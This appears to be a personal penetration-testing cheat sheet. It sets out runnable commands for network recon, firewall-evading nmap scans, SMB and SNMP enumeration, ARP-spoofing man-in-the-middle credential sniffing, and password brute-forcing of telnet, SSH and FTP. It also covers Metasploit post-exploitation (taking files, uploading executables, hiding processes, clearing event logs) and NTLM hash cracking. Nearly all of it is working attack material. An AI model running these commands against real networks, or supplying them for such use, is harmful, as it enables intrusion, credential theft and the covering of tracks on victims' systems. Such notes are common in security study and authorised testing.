### Network Security  
#### 1.1 Information Gathering
_1.1.1 Passive Recon_  

WhoIs Look-ups
```
$ whois domain.com
or
$ sudo nmap --script whois-domain domain.com -sn
```
DNS Enumeration  
Queries w/ Nslookup
```
$ Nslookup -query=<Arg(any/MX/NS)> domain.com
or interactive
$ nslookup
>set q=<Arg(A/MX/NS)>
>domain.com
```
Queries and Zonetransfers w/ Dig
```
$ Dig +nocmd domain.com <Arg(MX/NS/A)> +noall +answer
$ Dig +nocmd domain.com AXFR +noall +answer @domain.com // Zone Transfer
```
Other Options for DNS Enumeration
```
$ fierce -dns domain.com
$ dnsrecon -d domain.com
$ dnsmap domain.com
```

_1.1.2 Host Discovery_  
Nmap
```
$ sudo nmap -sn targetIP --disable-arp-ping
$ sudo nmap -sn -P<Arg(S/A)> targetIP --disable-arp-ping // TCP packet with SYN or ACK flag
$ sudo nmap -sn -PE targetIP --disable-arp-ping // ICMP echo request
$ sudo nmap -sn -PP targetIP --disable-arp-ping // Timestamp request
```
FPing
```
$ fping -A targetIP -e  // send ICMP echo packet, check if alive
$ fping -q -a -g target/24 -r 0 -e // send ICMP echo to subnet with no retries in quiet mode, only show if alive
```
HPing3
```
$ sudo hping3 -F -P -U target -c 3 // Xmas discovery scan, RA flag
$ sudo hping3 -1 192.168.1.x --rand-dest -I eth2 // host discovery on subnet on specificed interface
```

_1.1.3 Active Recon_  
**Basic**  
Nmap
```
$ sudo nmap -sS target -n // SYN scan, no hostname resolution
$ sudo nmap -sS -n -Pn -iL target.txt // SYN scan, from list of known live hosts
$ sudo nmap -sT target -F // TCP connect scan
$ sudo nmap -sU target -p 21,53,80,111,137 // UDP scan on specificed ports
$ sudo nmap -sX target --top-ports 200 // Xmas scan on top 200 ports
```
**Advanced**  
Nmap
```
Bypass firewall with fragmentation  
$ sudo nmap -f -sS targetIP -n -p 80,21,153,443 --disable-arp-ping -Pn --data-length 48
Bypass firewall by spoofing MAC or vendor 
$ sudo nmap --spoof-mac apple targetIP -p 80 -Pn --disable-arp-ping -n 
Bypass firewall with source port
$ sudo nmap --source-port 53 targetIP -sS
Bypass firewall with Decoys
$ sudo nmap -sS -DdecoyIP,decoyIP,ME,decoyIP targetIP -n
```
Nmap NSE (Location: /usr/share/nmap/scripts/)
```
$ sudo nmap --script-updatedb // Update NSE DB
$ sudo nmap --script-help "smb*" and discovery // search for script
$ sudo nmap --script auth targetIP // all authentication scripts, loud
$ sudo nmap --script smb-os-discovery -p 445 targetIP // SMB OS discovery
$ sudo nmap --script smb-enum-shares targetIP -p 445 // Enumerate SMB shares
```
Idle Scans w/ Nmap & Hping3
```
$ sudo nmap --script ipidseq targetIP -p 135 // Check if IP good zombie candidate, use known open port for accuracy
$ sudo nmap -sI zombieIP:135 targetIP -p 23 -Pn // Idle scan remote host with zombie IP on specified port

$ sudo hping3 -S -r targetIP -p 135 // Check if host good zombie candidate, look for id increment by 1
$ sudo hping3 -a zombieIP -S targetIP -p 23 // Spoof source to zombie IP, if increments by 2 then port is open
```
#### 1.2 Enumeration  
_1.2.1 NetBIOS Enumeration_  
Enum4Linux & SMBClient
```
$ enum4linux -a -v targetIP // NetBIOS enumeration scan
$ smbclient -L targetIP // List share names
$ smbclient \\\\targetIP\\Folder // Access share folder
smb:> get filename.txt /home/root/Desktop/filename.txt
```
_1.2.2 SNMP Enumeration (p.161)_   
Nmap & Snmpwalk
```
$ sudo nmap -sU -p 161 --script snmp-brute targetIP // Find available community string
$ snmpwalk -v 2c -c public targetIP // Enumerate SNMP information, where v = snmp version and c = community string
$ sudo nmap -sU -p 161 --script snmp-win32-users targetIP // Enumerate Windows users through SNMP
```
_1.2.3 MitM Attack_  
Manually  
```
$ sudo wireshark -i tap0 // Start wireshark on specificed interface
$ echo 1 > /proc/sys/net/ipv4/ip_forward // Enable IP forwarding, makes attacker machine proxy between two victims
$ arpspoof -i tap0 -t victimIP impersonatedIP // Telling the victim IP that we are impersonated IP via ARP reply
$ arpspoof -i tap0 -t impersonatedIP victimIP
!arp && http.authbasic // Filter basic authentication traffic in wireshark
$ dsniff -i tap0 // Sniffs authentication packets on specified interface while Mitm running
```
Automatically: Ettercap
```
$ sudo ettercap -G
Sniff > Unified Sniffing > tap0 // Specify interface to sniff on
Hosts > Scan for Hosts // Scans for available hosts on network
Right-click to select Victim 1 and 2
Mitm > ARP Poisoning > Sniff remote connections
View > Connections // Ettercap filters credentials submitted in Mitm

// To intercept and analyze HTTPS traffic
$ sudo nano /etc/ettercap/etter.conf // set uid and gid to 0
// Additionally, uncomment appropriate redir_command_on/off (in my case, iptables)
```
#### 1.3 Exploitation  
_1.2.1 Cracking Service Authentication_  
```
$ ncrack -vv -U usernames.txt -P passwords.txt targetIP -p telnet // Run Ncrack in verbose mode using a usernames and password file against the Telnet protocol
$ medusa -h targetIP -M ssh -U usernames.txt -P passwords.txt // Run Medusa using usernames and passwords lists against the SSH service, offers more protocols than ncrack
$ hydra -L usernames.txt -P passwords.txt ftp://targetIP // Run Hydra with usernames and password file against FTP, fast
$ patator ftp_login host=FILE0 user=FILE1 password=FILE2 0=hostslist.txt 1=usernames.txt 2=passwords.txt -x ignore:mesg=”Login incorrect.” // Patator offers more modules and protocol support, and highly customizable. Man page at $vim /usr/bin/patator
```
_1.2.2 Metasploit Framework_  
```
$ sudo msfupdate
$ sudo service postgresql start
$ msf> search type:exploit platform:windows or search cve:2015
$ msf> grep vnc search type:exploit
$ info windows/smb/ms08_067_netapi // gives information and description about the module
```
```
Meterpreter session 1 opened!
> download C:\\Users\\els\\Desktop\\file.txt // Downloads file.txt to local host from target
> upload clickme.exe C:\\Users\\els\\Desktop\\clickme.exe // Uploads executable file to user desktop
> execute -f cmd.exe -i H // Run executable and hide process from victim's view
> search -f secret.* // Search victim filesystem for file name secret with variable extension
> run post/windows/gather/enum_applications // Can run various post-exploitation scripts to gather more info
> ps && migrate <ProcessID> // List all processes then migrate to a chosen process ID

> clearev
```
```
Crack collected LM/NT hashes w/ Rainbow Tables
$ sudo rcracki_mt -h <first 8bits (16chars) of LM hash> -t 4 *.rti // uses a folder of rainbow tables to extract plaintext of first 8 bytes

$ locate netntlm
$ sudo perl netntlm.pl --file <netntlm hashes file> --seed <discovered plaintext from first 8 bytes> 
```
